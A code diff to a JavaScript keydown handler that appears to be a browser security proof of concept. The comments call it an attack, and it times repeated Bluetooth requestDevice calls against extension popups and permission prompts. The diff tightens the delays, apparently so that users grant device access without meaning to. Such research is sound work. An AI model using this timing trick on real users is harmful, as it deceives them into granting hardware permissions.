@@ -42,7 +42,7 @@ window.addEventListener('keydown', (e) => {
       // If we call getDisplayMedia() *after* extension popup is opened, the extension popup is closed and attack fails.
       setTimeout(() => {
         navigator.bluetooth.requestDevice({acceptAllDevices:true})
-        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 400)
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 150)
       }, 1);
     } else {
       // Main scenario: permission prompt
@@ -50,8 +50,8 @@ window.addEventListener('keydown', (e) => {
       // If we call getUserMedia() *after* extension popup is opened, the permission prompt
       // is not shown until extension prompt is closed by user.
       setTimeout(() => {
-        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 10);
-        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 800)
+        navigator.bluetooth.requestDevice({acceptAllDevices:true});
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 150)
       }, 1);
     }
   }
